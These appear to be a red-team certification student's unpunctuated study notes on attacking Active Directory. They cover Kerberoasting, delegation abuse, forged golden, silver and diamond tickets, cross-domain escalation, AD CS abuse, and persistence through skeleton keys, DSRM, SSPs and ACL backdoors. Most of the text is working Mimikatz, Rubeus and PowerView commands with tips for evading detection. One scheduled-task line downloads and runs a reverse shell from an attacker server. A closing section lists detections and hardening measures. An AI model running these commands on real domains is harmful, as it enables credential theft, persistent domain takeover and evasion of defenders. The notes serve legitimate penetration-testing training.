Kerberoast - effective as service accounts are often ignored and passwords are rarely changed - note machine accounts have 120 character passwords - kerberoast is only effective against users who are being used as service accounts - can be found with Get-NetUser -SPN or Get-ADUser -Filter ServicePrincipalName -ne null -Properties ServicePrincipalName - service accounts typically have privileged access Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 207 png - in step four the TGS is saved to disc - because TGS encrypted with service account hash you can try to perform an offline password attack - quiet as only one event 4769 is logged - if successful you can perform a silver ticket attack Exploitation powershell Obtain TGS Add-Type -AssemblyName System IdentityModel New-Object System IdentityModel Tokens KerberosRequestorSecurityToken -ArgumentList SERVICE follow 0xd4y notes local Check TGS was granted by running klist Save TGS to disk Invoke-Mimikatz -Command kerberos list export - you can also use PowerView s Request-SPNTicket and crack with John or Hashcat - when requesting a TGS you will be detected if forcefully downgrading the encryption to RC4-HMAC - more opsec safe to only request RC4-HMAC encryption for services that only support that encryption which can be done with Rubeus exe kerberoast stats rc4opsec - note that even if the user in Protected Users group you can still request RC4 encryption in Kerberos - DO NOT request several TGS tickets in quick succession - detected by MDI as an anomaly - instead perform Rubeus exe kerberoast user 0xd4y simple AS-REP Roast - if Kerberos preauth is not required for a user required by default you can get a user s AS-REP and try to crack it - can be found with Get-ADUser -Filter DoesNotRequirePreAuth -eq True -Properties DoesNotRequirePreAuth Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 208 png - when preauth is not required for the user you can request authentication data for that user - KDC then responds in step 2 with a TGT encrypted with the user s NTLM hash - this can then be saved to disk and cracked offline - if you have GenericAll or GenericWrite control over a group or user in a group you can disable preauth for a user - of course you could reset the user s password instead but this is less opsec friendly - you could also just set an SPN for the user instead and then kerberoast it Exploitation powershell Find permissions identity has for users in domain Invoke-ACLScanner -ResolveGUIDs IdentityReferenceName -match GROUP NAME OR USER NAME Disable PreAuth for user 0xd4y Set-DomainObject -Identity 0xd4y -XOR useraccountcontrol 4194304 Get TGT for user 0xd4y Get-ASRepHash -UserName 0xd4y - the Set-DomainObject command may result in an Exception calling GetNames error but it may have still worked - this can be verified with Get-DomainUser -Preauthnotrequired - it may be possible to resolve this issue by starting a new PowerShell session Set-SPN - with GenericAll or GenericWrite permissions for a user you can set the user s SPN to anything and request a TGS for it even if there is no service running for that SPN - the TGS can then be saved to disk and cracked - SPN must be unique in the forest Exploitation powershell Set unique SPN for user 0xd4y Set-ADUser -Identity 0xd4y -ServicePrincipalNames Add doesnot matter Request TGS Add-Type -AssemblyName System IdentityModel New-Object System IdentityModel Tokens KerberosRequestorSecurityToken -ArgumentList doesnot matter Save TGS to disk Invoke-Mimikatz -Command kerberos list export - if an error occurs when trying to set an SPN for a user it may be because the SPN already exists Kerberos Delegation - delegation allows reuse of credentials to access resources hosted on a different server - delegation on DC is not blocked by default Suppose a user wants to access a web server 1 User provides creds to DC and DC returns a TGT 2 User requests a TGS for web service and DC provides a TGS 3 User sends TGS and TGT to web server - TGT embedded inside TGS with unconstrained delegation 4 Web server uses user s TGT to request a TGS from the DC for the database server 5 Web server service account connects to database service as the user T hree Types of Kerberos Delegation 1 Unconstrained Delegation - server can access any service on any computer on behalf of that user - note that DCs will always show up as unconstrained and is not an interesting finding - TGT stored in LSASS so with admin privileges on compromised server you can extract any user s TGT that authenticated to service - great way to privesc especially when domain admins connect to the service powershell Find computers with unconstrained delegation enabled Get-ADComputer -Filter TrustedForDelegation -eq True Get-ADUser -Filter TrustedForDelegation -eq True Extract TGT from compromised service Invoke-Mimikatz -Command sekurlsa tickets Add export to save to disk Perform Pass-the-Ticket attack Invoke-Mimikatz -Command kerberos ptt TGT FILE Printer Bug - abuses MS-RPRN to force any machine running the Spooler service to connect to an arbitrary machine - can be abused by any domain user powershell Monitor TGTs Rubeus exe monitor interval 5 nowrap Force target machine to connect to the owned machine MS-RPRN exe target 0xd4y notes local owned 0xd4y notes local Pass the b64-encoded ticket Rubeus exe ptt ticket b64 ticket - may result in RPC server is unavailable error but it may have worked check Rubeus - works even if DAs are not allowed to connect to non-DC machines because the domain controller account can be used to abuse this bug 1 Constrained Delegation - server only allowed to access specific services on specific computers on behalf of user powershell Find users and computers with constrained delegation enabled also returns msDS-AllowedToDelegateTo Get-ADObject -Filter msDS-AllowedToDelegateTo -ne null -Properties msDS-AllowedToDelegateTo Can also use PowerView s Get-DomainUser -TrustedToAuth or Get-DomainComputer -TrustedToAuth Getting TGT for compromised service account kekeo tgt ask user SERVICE ACCOUNT domain follow 0xd4y notes local rc4 NTLM HASH Using kekeo get TGS for service on behalf of Domain Administrator tgs s4u tgt TGT FILE user Administrator follow 0xd4y notes local service SERVICE MACHINE - note you can only specify a service that is allowed by the msDS-AllowedToDelegateTo restriction or a service running under the same account - no validation is performed on SPN - especially useful when the service is running under a machine account can potentially get access to the ldap service and run a DCSync attack by just impersonating a domain admin - no need to wait for user to connect to service as you are not extracting their TGT you are just impersonating them when requesting a TGS Protocol Transition Suppose a user inputs their username and password in some login form of a web server to access some files The web server then needs to authenticate to a file server to obtain the requested files The major problem is Which domain user tried to access the web server This is step 2 Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 209 png 1 0xd4y authenticates to web service 2 Web service requests ticket from KDC for Joe no password is supplied 3 KDC checks for the TRUSTED TO AUTHENTICATE FOR DELEGATION attribute on the web server service account and it also checks that Joe is not blocked for delegation Returns a forwardable ticket for Joe s account if true S4U2Self 4 Forwardable ticket is passed to KDC and a TGS is requested for CIFS file server 0xdy notes local 5 KDC checks msDS-AllowedToDelegateTo field on web server service account TGS is sent if the service is allowed S4U2Proxy 6 Web service uses TGS to authenticate to CIFS on file server as Joe - note the big problem in step 2 this means you can access CIFS on file server 0xd4y notes local by impersonating any user including a domain admin Resource-based Constrained Delegation - the service owner chooses who can delegate to it as defined by msDS-AllowedToActOnBehalfOfOtherIdentity visible as PrincipalsAllowedToDelegateToAccount - with GenericAll or GenericWrite to the server you can run the following powershell Check for interesting ACLs on account you own Find-InterestingDomainACL identityreferencename -match 0xd4y Add your owned machine account to trusted delegate to Set-ADComputer -Identity target machine -PrincipalsAllowedToDelegateToAccount 0xd4y-comp Get hash for 0xd4y-comp Invoke-Mimikatz -Command sekurlsa ekeys Use Rubeus to access HTTP service as domain admin can pick whatever service you want Rubeus exe s4u user 0xd4y-comp aes256 MACHINE ACCOUNT HASH msdsspn HTTP follow-0xd4y impersonateuser Administrator ptt - with write permissions you can instead change the delegation of that machine e g changing constrained to unconstrained but this is noisier DNSAdmins - members of DNSAdmins group can load arbitrary DLLs as system privileges of dns exe - can load arbitrary DLL to DC - if loading of plugin fails DNS service will not start - need privileges to restart DNS service - by default they are not able to restart DNS service but some organizations may have it enabled - find DNS admins with Get-ADGroupMember -Identity DNSAdmins Exploitation powershell First serve an arbitrary DLL on some domain-joined workstation that you own Then do the following dnscmd DNS SERVER config serverlevelplugindll WORKSTATION YOU OWN malicious dll Restart the DNS service sc DNS SERVER stop dns sc DNS SERVER start dns Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2010 png Enterprise Admins Child Domain to Forest Root - enterprise admins have access to all domains in a forest - Enterprise Admins group only exists within forest root Two ways of escalating privileges between two domains in same forest 1 krbtgt hash 2 trust tickets How Authentication Works Between Domains and Forests Suppose you are a user in follow 0xd4y notes local and you try to access an app server that is present in the parent domain 0xd4y notes local Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2011 png In step 3 the follow 0xd4y notes local DC checks its global catalog for the app server the client is requesting The DC then sees that the app server does note exist in its own global catalog but it does exist in the parent domain so it sends an inter-realm TGT encrypted and signed with the trust key to the client In step 5 the inter-realm TGT is sent to the 0xd4y notes local DC whose only validation for the TGT is whether or not it can decrypt it with the trust key the same key used to encrypt the TGT Therefore we forge an inter-realm TGT wherein we write that there is a SIDHistory of Enterprise Admins 519 - in the case when the trust is between two different forests the last part of the SID is stripped as long as it is between 500 to 1000 - any ticket that crosses forest trust boundary will therefore not be privileged - this means it is not possible to escalate to EA across forest trusts by abusing SIDHistory Trust Tickets - when compromising a domain you can craft golden tickets destined for other domains within the forest - no effective defense against this works as intended - a compromise of one DC in a forest is enough to assume that the forest is fully compromised - note that managed service accounts end with a dollar sign - note the first method is the most opsec safe and still bypasses MDI and log-based detections powershell First method of getting trust ticket RC4 hash run within DC Invoke-Mimikatz -Command lsadump trust patch -ComputerName follow-dc Then forge a TGT First method Invoke-Mimikatz -Command kerberos golden user 0xd4y-dc domain CURRENT CHILD DOMAIN sid CURRENT CHILD DOMAIN SID groups 516 sids PARENT ENTERPRISE ADMIN GROUP SID -519 krbtgt KRBTGT HASH ptt Finally run a dcsync attack you can use SafetyKatz instead of Invoke-Mimikatz just make sure to leave out -Command from command Invoke-Mimikatz -Command lsadump dcsync user forest root krbtgt domain 0xd4y local exit Second method of getting trust ticket RC4 hash Invoke-Mimikatz -Command lsadump dcsync user notes subscribe 0xd4y Then forge a TGT Second method Invoke-Mimikatz -Command kerberos golden user 0xd4y-dc domain CHILD DOMAIN sid CURRENT DOMAIN SID sids PARENT ENTERPRISE ADMIN GROUP SID -519 rc4 TRUST TICKET service krbtgt target FOREST ROOT DOMAIN ticket C PATH TO SAVE trust tkt kirbi Afterwards request a TGS to a service using the TGT asktgs exe C PATH TO trust tkt kirbi SERVICE youtube subscribe 0xd4y notes local Note you can also run Invoke-Mimikatz -Command kerberos ptt C PATH TO ticket kirbi This will also automatically inject the ticket into your current session Finally inject the TGS in your current powershell session kirbikator exe lsa C PATH TO TGS kirbi - note the domain a k a intra-realm trust key is rotated every 30 days automatically and can also be rotated manually - this is unlike inter-forest a k a inter-realm trust keys which do not automatically rotate - no need to have DA privileges to forge a TGT - only need DA privileges to get the hash used for forging a TGT - therefore it is enough to compromise one domain in a forest to compromise the entire forest - note that for the sids parameter it is more stealthy to use the domain controllers group S-1-5-21- -516 and the enterprise domain controllers group S-1-5-9 as it avoids some logs - looks like sids S-1-5-21-1004336348-1187298915-682003330-516 S-1-5-9 - when running remote command on forest root a 4624 and 4634 will occur which is normal but a 4672 Admin Logon event will be triggered as well which is an anomaly - more opsec safe to use the child DC user to access the forest root DC rather than using a DA - it s normal for two DCs to sync to each other AD Certificate Service CS - server role allowing for building a public key infrastructure PKI and public key cryptography digital certificates and digital signature capabilities - certificate is issued to a user or machine for authentication encryption or signing among many other capabilities - the certificate template contains the certificate data such as enrollment permissions EKUs Extended Key Usages expiry etc AD CS can be used to among much more 1 Extract user and machine certificates 2 Retrieve NTLM hashes 3 Domain persistence 4 DA and EA privesc Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2012 png - ESC6 will be obsolete May 2023 Command Description --- --- Certify exe cas Look for certificate authorities in domain Certify exe find Enumerate templates Certify exe find vulnerable Find vulnerable templates Common Misconfigurations - low-privileged users granted enrollment rights - manager approval disabled - auth signatures not required ESC1 Exploitation Must have enrollment rights and msPKI-Certificates-Name-Flag must contain the value of ENROLLEE SUPPLIES SUBJECT powershell Request certificate for DA you can do the same with an EA just specify the domain under altname like 0xd4y local Administrator Certify exe request ca CA NAME VALUE template TEMPLATE NAME altname Administrator Copy cert to a pem file and then convert to PFX for Rubeus and supply a password of follow 0xd4y openssl exe pkcs12 -in C PATH TO cert pem -keyex -CSP Microsoft Enhanced Cryptographic Provider v1 0 -export -out C PATH TO SAVE cert pfx Request TGT for DA using Rubeus Rubeus exe asktgt user Administrator certificate C PATH TO cert pfx password follow 0xd4y ptt When requesting TGT for EA use Rubeus exe asktrgt user 0xd4y local Administrator dc 0xd4y local certificate C PATH TO cert pfx password follow 0xd4y ptt - the cert pem is equivalent in functionality to having a user s TGT - this is also decently opsec safe as it is underresearched - may be caught only because the key type is rc4 hmac Domain Persistence - note that a golden ticket is a TGT while silver ticket is a TGS - always ask the client before performing persistence - especially for the Skeleton Key DSRM and CustomSSP methods which downgrade the target organization s security Golden Ticket DC does not validate contents of decrypted TGT - with hash of krbtgt account you can forge a TGT and access any resources - can impersonate any user - if the krbtgt password is changed manually doesn t matter how complex it is it will be automatically updated to a complex password instead - if you use a golden ticket ensure you are using it from a machine where a domain administrator has already used before - otherwise you will create a log of a domain admin login from a new workstation Creating Golden Ticket powershell Invoke-Mimikatz -Command kerberos golden User Administrator domain follow 0xd4y notes local sid SID krbtgt KRBTGT HASH id 500 groups 512 startoffset 0 endin 600 renewmax 10080 ptt - note you can specify a user that does not exist in the domain but this looks suspicious - ptt pass-the-ticket signifies to inject ticket in current PS process - you can use ticket instead to save the ticket to a file for later use - better to use ptt instead of ticket to not use old TGTs and to not touch disc old TGTs are sometimes monitored - startoffset 0 signifies to make the ticket available right now - endin 600 sets ticket lifetime to 600 minutes default AD setting - renewmax 10080 sets ticket renewal lifetime to 7 days which is 10 080 hours default AD setting - even if a sysadmin changes the krbtgt password a golden ticket will still work as krbtgt remembers the previous password - golden ticket attack does not need special local or domain privileges - can be run from non-domain joined machine - ensure you also specify the sids ENTERPRISE DC GROUP parameter to decrease chances of detection by MDI - better to just use diamond ticket which has better chances of bypass Silver Ticket - forged TGS when accessing service - requires NTLM hash of service account - allows you to impersonate any user when accessing service - unless using silver ticket against DC this silver ticket does not trigger a 4672 Admin Logon event - silver ticket fails if PAC check is made not enabled by default - PAC stands for Privileged Attribute Certificate - silver tickets last 30 days by default for computer accounts - note machine account passwords are rotated unlike krbtgt Creating Silver Ticket powershell Invoke-Mimikatz -Command kerberos golden User Administrator domain follow 0xd4y notes local sid SID target follow-dc 0xd4y notes local service SERVICE rc4 NTLM HASH ptt - note the service can be WSMAN RPCSS HOST HTTP etc - you can get RCE by creating silver ticket for HOST service and creating a scheduled task - schtasks create S follow 0xd4y notes local sc Weekly ru NT Authority SYSTEM tn TASK NAME tr REVERSE SHELL PAYLOAD then run the task with schtasks run s follow 0xd4y notes local tn TASK NAME - also possible to execute commands with WMI service check with gwmi -Class win32 operatingsystem -ComputerName follow 0xd4y notes local - HTTP allows you to PSRemote Getting RCE - create silver ticket for HOST service powershell schtasks create S target 0xd4y notes local SC Weekly RU NT Authority System TN Follow0xd4yTask TR powershell exe -c IEX New-Object Net WebClient DownloadString http attacker server com Reverse Shell ps1 schtasks Run S target 0xd4y notes local TN Follow0xd4yTask Diamond Ticket - like golden ticket but more opsec safe - silver ticket is a lot more opsec safe than both - instead of crafting a TGT you request a TGT from the DC decrypt the TGT and make modifications and then send back that TGT to the DC - harder to detect than golden ticket because defenders will see that for the submitted TGT there was a prior corresponding TGT request - most detectable when using the modified TGT rather than the initial submission of the modified TGT - ensure you are using it from a workstation that DAs typically use Skeleton Key - patches DC to allow access to any user with single password - indefinite persistence as long as the target does not reboot - usually people reboot the DC every month or several months - only works against machines that authenticate to the patched DC - can result in issues with AD CS - can only patch LSASS once per reboot - otherwise the following error occurs ERROR kul m misc skeleton Second pattern not found - note that this attack does not overwrite any password Creating Skeleton Key powershell Invoke-Mimikatz -Command privilege debug misc skeleton -ComputerName follow-dc 0xd4y notes local - password is mimikatz always change this - you can then do Enter-PSSession -ComputerName target 0xd4y notes local -Credential examplecorp Administrator - enter skeleton key password or legitimate Removal of LSASS Protection If LSASS is a protected process you must run the following powershell privilege debug processprotect process lsass exe remove misc skeleton - - this would be very noisy in logs DSRM Directory Service Restore Mode a k a SafeModePassword - required when server is promoted to DC - the local admin s password on DC is the DSRM password - persistence length is typically the longest - with hash of DSRM password you can perform a PtH attack to access DC - logon behavior of DSRM account needs to be changed before you can log into it - within the DC do New-ItemProperty HKLM System CurrentControlSet Control LSA -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD - if this property already exists do Set-ItemProperty HKLM System CurrentControlSet Control LSA -Name DsrmAdminLogonBehavior -Value 2 Dump DSRM Password powershell Invoke-Mimikatz -Command token elevate lsadump sam -ComputerName follow-dc Custom Security Support Provider SSP - DLL that allows an app to authenticate e g NTLM Kerberos Wdigest CredSSP etc - Mimikatz has mimilib dll SSP - logs local logons and service accounts and machine passwords on target server in plaintext Exploitation - passwords logged to C Windows system32 kiwissp log - perform within the DC Method 1 1 Add mimilib dll in System32 and to HKLM SYSTEM CurrentControlSet Control Lsa Security Packages 2 Reboot the machine powershell packages Get-ItemProperty HKLM System CurrentControlSet Control Lsa OSConfig -Name Security Packages select -ExpandProperty Security Packages packages mimilib Set-ItemProperty HKLM System CurrentControlSet Control Lsa OSConfig -Name Security Packages -Value packages Set-ItemProperty HKLM System CurrentControlSet Control LSA -Name Security Packages -Value packages Method 2 Invoke-Mimikatz -Command misc memssp - writes to LSASS - not stable on Windows Server 2016 ACLs AdminSDHolder - every 60 minutes by default SDPROP Security Descriptor Propagator overwrites ACL of all protected groups with the ACL of the AdminSDHolder ACL - instead of adding user as a member to a group you can give the user full permissions over a group - you can verify if it worked with Get-ObjectACL -SamAccountName GROUP NAME -ResolveGUIDs IdentityReference -match 0xd4y - with propagated permissions you can run one of the following depending on permissions - Add-ADGroupMember -Identity GROUP NAME -Members follow 0xd4y - Set-ADAccountPassword -Identity 0xd4y -NewPassword ConvertTo-SecureString f0ll0w 0xd4y -AsPlainText -Force Interactive Method - found within the Security tab of a group s properties Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2013 png Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2014 png - note when modifying ACL of specific group not within the AdminSDHolder ACL the changes get overwritten - that s why persistence must be done within the AdminSDHolder ACL Non-Interactive Method Set-ADACL -DistinguishedName CN AdminSDHolder CN System DC dollarcorp DC moneycorp DC local -Principal 0xd4y - within the DC propagate the changes Invoke-SDPropagator -showProgress -timeoutMinutes 1 - interesting rights to have can be specified with -Rights ResetPassword WriteMembers etc Rights Abuse - DCsync attack can be performed without being a DA as long as the user at least has replication rights GenericAll is more than enough - can be found with Get-ObjectACL -DistinguishedName dc follow dc 0xd4y notes dc local -ResolveGUIDs IdentityReference-match 0xd4y -and ObjectType -match replication -or ActiveDirectoryRights -match GenericAll - modify domain root ACL to give user Full Control or DCSync permissions Interactive Method Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2015 png Required permissions for DCSync Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2016 png NonInteractive Method - Set-ADACL -DistinguishedName DC dollarcorp DC moneycorp DC local -Principal 0xd4y -GUIDRight DCSync Security Descriptors - change namespace security descriptor to allow full access for a user you own - can edit to allow access to PSRemoting WMI access Remote registry etc - good persistence method as many organizations do not monitor domain object ACLs PSRemoting - Set-RemotePSRemoting -UserName 0xd4y -ComputerName follow-dc 0xd4y notes local - may result in an I O error but the command still successfully ran - may result in crashing WINRM service on target machine - allows you to have access to remote computer without needing administrative privileges - PSRemoting uses WINRM ports 5985 and 5986 WMI - after having WMI access you can execute commands remotely using Invoke-WmiMethod -Class win32 process -Name Create -ArgumentList calc exe -ComputerName follow-0xd4y On local machine - Set-RemoteWMI -Username 0xd4y On remote machine - Set-RemoteWMI -Username 0xd4y -ComputerName follow-dc -namespace root cimv2 - add -Credential flag to specify credentials Remote Registry - Add-RemoteRegBackdoor -ComputerName follow-dc -Trustee 0xd4y - Get-RemoteMachineAccountHash -ComputerName follow-dc 0xd4y notes local - returns machine account hash - can create silver ticket - you can also use Get-RemoteLocalAccountHash or Get-RemoteCachedCredential Forest Privilege Escalation - whatever access the compromised domain admin has in the target forest those will be the permissions you have in that forest - therefore you could be a domain admin in one forest but a normal domain user in a different forest - use Invoke-Mimikatz -Command lsadump lsa patch or Invoke-Mimikatz -Command lsadump trust patch to get the trust key for the inter-forest trust - inter-forest trust keys do not automatically rotate unlike intra-forest domain trust keys MSSQL - good for lateral movement - domain users can be mapped to database roles - database links work across forest trusts - if you have a database that is linked to another database you can potentially run commands on that remote SQL server and laterally move Get-SQLServerLinkCrawl -Instance example-mssql -Query exec master xp cmdshell whoami -QueryTarget target-mssql - this command runs the whoami command across the nodes - without the -QueryTarget parameter the command will be run on every link in chain - target server must have xp cmdshell enabled - can be enabled manually if rpcout is enabled disabled by default using EXECUTE sp configure xp cmdshell 1 reconfigure AT example-sql Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2017 png - ft stands for format table makes the output look nicer Command Description --- --- Get-SQLServerLink -Instance example-mssql Find links to remote servers Get-SQLServerLinkCrawl -Instance example-mssql Enumerate database links Get-SQLInstanceDomain Get-SQLConnectionTestThreaded -Verbose Check which SQL servers you can access Get-SQLInstanceDomain Get-SQLServerInfo -Verbose Lists information about each SQL server Forest Persistence DCShadow - registers a new domain controller - used to push attributes SIDHistory SPN etc specific objects without leaving logs for modified object no 4662 event or any other change log event created - this is because attribute changes from a domain controller does not create change logs - requires DA privileges and attacker must own forest root domain Methodology Within Mimikatz perform the following powershell Start RPC servers with SYSTEM privileges and modify attribute in this example we ll edit the description of the 0xd4y user processtoken lsadump dcshadow object 0xd4y attribute Description value Subscribe to 0xd4y on YouTube Push the changes lsadump dcshadow push - you may need to first impersonate a DA with sekurlsa pth user Administrator domain 0xd4y notes local ntlm DA HASH impersonate - to push the changes you will need to run another mimikatz instance Privilege Movement Lateral Movement Command Description --- --- Find-LocalAdminAccess Returns machines in current domain where current user has local admin access Enter-PSSession -ComputerName HOSTNAME Log into other computer remotely works if you have local admin access on destination computer Invoke-Command -ComputerName HOSTNAME -ScriptBlock COMMAND Runs command on remote machine s Use FilePath instead of ScriptBlock to execute a file Invoke-Mimikatz -ComputerName comp1 comp2 Can be used to extract creds and write to LSASS using Invoke-Command and PS remoting winrs -r follow-0xd4y whoami Run whoami command on follow-0xd4y computer using WINRM - Find-LocalAdminAccess is very noisy - first runs Get-NetComputer and then uses Invoke-CheckLocalAdminAccess on each machine - if Enter-PSSession does not work you may need to run Enable-PSRemoting - PS remoting uses port 5985 http while 5986 uses SSL - note only the transport tunnel is in cleartext but the traffic inside that tunnel is encrypted - note that Invoke-Mimikatz is better to use than mimikatz exe as it does not require you to write to disc - you can run this remotely within a session Invoke-Command -ScriptBlock function Invoke-Mimikatz -Session session - use Invoke-Mimikatz -Command sekurlsa pth user Administrator domain follow-dc ntlm NTLMHASH run powershell exe to generate tokens from hashes writing to LSASS - this is an overpass-the-hash attack - creates a ticket using NTLM hash of user - the winrs command works on a remote computer if you have admin privileges on it Interacting with Script Inside Session powershell session New-PSSession -ComputerName HOSTNAME Invoke-Command -FilePath PATH TO PS1 SCRIPT -Session session Enter-PSSession -Session session Invoke-Command Invoke-Mimikatz Tips - note the password of service accounts are in cleartext when running mimikatz because their passwords are stored in LSA secrets - stored in HKEY LOCAL MACHINE Security Policy Secrets - password in cleartext because this is needed for the service to log in as the service account - you can run commands from local memory when targeting remote computers powershell Invoke-Command -ScriptBlock Invoke-Mimikatz -Session session - this runs the Invoke-Mimikatz cmdlet from one s local PS session and executes it on the remote machine - with the hash of a user you can start a session using a pass-the-hash attack make sure you run this with local admin rights powershell Invoke-Mimikatz -Command sekurlsa pth user 0xd4y domain follow 0xd4y notes local ntlm NTLM HASH run powershell exe - after running this whoami will not show that you are the impersonated user but you are and have the permissions of that user Another Method for Running Mimikatz on Remote Machine 1 session New-PSSession -ComputerName follow-dc 0xd4y notes local 2 Invoke-Command -Session session -FilePath PATH TO PS1 FILE 3 Enter-PSSession -Session session 4 Invoke-Mimikatz -Command lsadump lsa patch - you can also extract the krbtgt hash by using DCSync Invoke-Mimikatz -Command lsadump dcsync user vuln corp krbtgt - this avoids running Mimikatz on the remote machine Local Privilege Escalation Common Misconfigurations - missing patches - passwords in clear text - AlwaysInstallElevated turned on see https 0xd4y com reports Love Writeup pdf https 0xd4y com reports Love 20Writeup pdf for how to exploit - misconfigured services unquoted service path permission of service is misconfigured overwrite exe binary etc - Get-ServiceUnquoted - Get-ModifiableServiceFile - Get-ModifiableService - Get-WMIObject Win32 service select Name PathName - Invoke-ServiceAbuse - abuse discovered misconfigured service - Use the following as it is the least noisy though still noisy Invoke-ServiceAbuse -Name VULNERABLE SERVICE -Command COMMAND - Invoke-AllChecks - scan for common misconfigurations that can result in privesc - DLL hijacking - AutoLogon enabled password stored in clear text or easily decryptable found in registry Checks - PowerUp Invoke-AllChecks - in the case of an unquoted service check if CanRestart is True and it is being run with higher privileges than your current user StartName - otherwise need to wait for server to reboot or other user to restart it - service is not vulnerable if you need to drop a binary in the root C Admin privs needed for that - BeRoot beRoot exe - Privesc Invoke-PrivEsc Defense In incident response scenarios run Enter-PSSession -ComputerName TARGET COMPUTER -Credential CLIENT DOMAIN Administrator and type mimikatz as the password If it works then this is indicative of skeleton key persistence - find specific log ID with Get-WinEvent -FilterHashtable Logname Security ID EVENT ID -MaxEvents NUMBER OF EVENTS Format-List -Property Advanced Threat Analytics ATA - useful for detecting recon compromised credential attacks and cred hash ticket replay attacks - can detect behavior anomalies - traffic to DCs is collected by the ATA and an activity profile is built over time Monitoring Traffic - looks for spikes in network traffic - look for 4624 Account Logon and 4634 Account Logoff event IDs - caused by the Find-LocalAdminAccess cmdlet - monitor changes to HKLM System CurrentControlSet Services DNS Parameters look for DNS stops and starts and monitor event 770 which shows the location from which the DLL was loaded - helps monitor potential DNSAdmins attacks - 4672 on any machine other than the DC should be tracked - DA permissions should not be used on any other machine in a properly configured AD environment Kerberoast - one of the most silent attacks - triggers 4769 Kerberos ticket was requested looks normal - use secure service account passwords 25 characters - use managed service account - uses password rotation and delegated SPN management - monitor 4769 with the following filter - service name krbtgt or does not end with - account name not from machine domain filters requests from machines - failure code is 0x0 only shows success transactions where user received a TGS - ticket encryption type is 0x17 - AES is 0x12 while MD5 HMAC is 0x17 - can obtain TGS with Invoke-Mimikatz -Command kerberos list export or with Impacket s GetUserSPNs script ACL Attacks Logs for this attack not enabled by default otherwise the following events are triggered - triggers events 4662 An operation was performed on an object 5136 A directory service object was modified and 4670 Permissions on an object were changed Stopping Enumeration Techniques - use NetCease ps1 on server to prevent users from running Get-NetSession on that server - stops Invoke-UserHunter attacks - NetCease ps1 can break things be careful before using Stopping Golden Ticket - change krbtgt password account twice krbtgt remembers the previous password - ensure that you do not change the password twice within 10 hours as this will invalidate all the tickets already distributed default AD ticket lifetime is 10 hours - triggers 4624 Account Logon 4634 Account Logoff and 4672 Admin Logon Mitigating Skeleton Key Run LSASS as protected process - requires mimikatz driver mimidriv sys to run on target s disk - removal of this protection would be very noisy - looks like a service installation in the logs - may break some drivers and plugins - skeleton key creates events 7045 service installed on system - Kernel Mode Driver 4673 Sensitive Privilege Use and 4611 trusted logon process registered with Local Security Authority Password Solutions Local Administrator Password Solution LAPS - used to solve the problem of have a local admin on multiple workstations with the same password - centralized password storage - computer objects have two new attributes ms-mcsAdmPwd stores pass in cleartext and ms-mcsAdmPwdExpirationTime stores password expiration time - although storage is in cleartext transmission is encrypted Credentials Guard - available only on Windows 10 or later and Windows Server 2016 or later - protects LSASS by isolating it using virtualization - only allows privileged system software to access it - restricts access to NTLM hashes and TGTs - effective in stopping PtH and Over-PtH attacks - makes it hard to read and write to LSASS - note LSA secrets and SAM are still not protected - cannot be enabled on DCs breaks authentication Deception Tricking threat actors into going down pathways that would trigger alerts and waste their time - create some users with interesting properties that have easy-to-find exploits - intentionally create some kerberoastable service accounts - you can also create a group where upon reading the group DACL discretionary access control list it triggers a 4662 event - decoy users can be created with Create-DecoyUser Detecting Other Persistence Methods DSRM Malicious SSP - creates 4657 event ID Audit creation change of HKLM System CurrentControlSet Control Lsa DsrmAdminLogonBehavior SecurityPackages Hardening PowerShell - disable PowerShell if nothing is using it in your organization - if this is possible ensure System Management Automation dll is blocked otherwise it is possible to load PowerShell functionality with NET code - this is because PowerShell is not powershell exe it is System Management Automation dll the PS console is just a host for the DLL - do not install PowerShell 6 0 0 PowerShell Core instead install PowerShell 5 1 many security features not supported on 6 0 0 - use AppLocker and Device Guard to restrict PowerShell scripts - check AppLocker policy Get-AppLockerPolicy -Effective select -ExpandProperty RuleCollections - use WDAC whenever possible - better than AppLocker as it is effective even against local admins - AppLocker can by disabled as an admin - use ConstrainedLanguage mode - can be found with ExecutionContext SessionState LanguageMode - can only run built in cmdlets - cannot load NET classes type accelerators arbitrary C code via add-type prohibits complex scripts etc Logging Note that the warning level for the log checks only work against a known list of potentially malicious commands You can either enable logging via the registry or via group policies - enable console logging for everything that uses the PowerShell engine powershell exe PowerShell ISE NET DLL msbuild installutil etc and forward logs to a log system - can be found under Administrative Templates Windows Components Windows PowerShell Turn on PowerShell Transcription - optionally set EnableTranscripting to 1 under HKLM Software Policies Microsoft Windows PowerShell Transcription - enable script block logging under Administrative Templates Windows Components Windows PowerShell Turn on PowerShell and or set EnableScriptBlockLogging to 1 under HKLM Software Policies Microsoft Windows PowerShell ScriptBlockLogging - you should also enable logging for modules under Administrative Templates Windows Components Windows PowerShell Turn on Module Logging and or set EnableModuleLogging to 1 under HKLM SOFTWARE Wow6432Node Policies Microsoft Windows PowerShell ModuleLogging - also set the registry key to for enabling it on all modules - results in a large number of logs - turn on System-wide transcription to log ALL PowerShell commands however the logs are not protected - if password is entered in PowerShell it shows in plaintext in the logs Bypassing PowerShell Defenses - PowerShell downgrade - version 2 does not support the aforementioned detection mechanisms - logged under event 400 Engine state is changed from None to Available look for EngineVersion - you can also potentially use PowerShell 6 0 0 Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2018 png - modifying modules in memory - check Applocker policy it may be possible to run some scripts in specified directories - obfuscation - Windows Script Block Logging for the Warning level works by comparing the executed PowerShell command with a list of known malicious commands https github com PowerShell PowerShell blob master src System Management Automation engine runtime CompiledScriptBlock cs - using trusted executables and trusted scripts with code injection tools that rely on LOLBINs - can use trusted executable and scripts as a proxy for execution of malicious code see PowerShdll https github com p3nt4 PowerShdll and nopowershell https github com bitsadmin 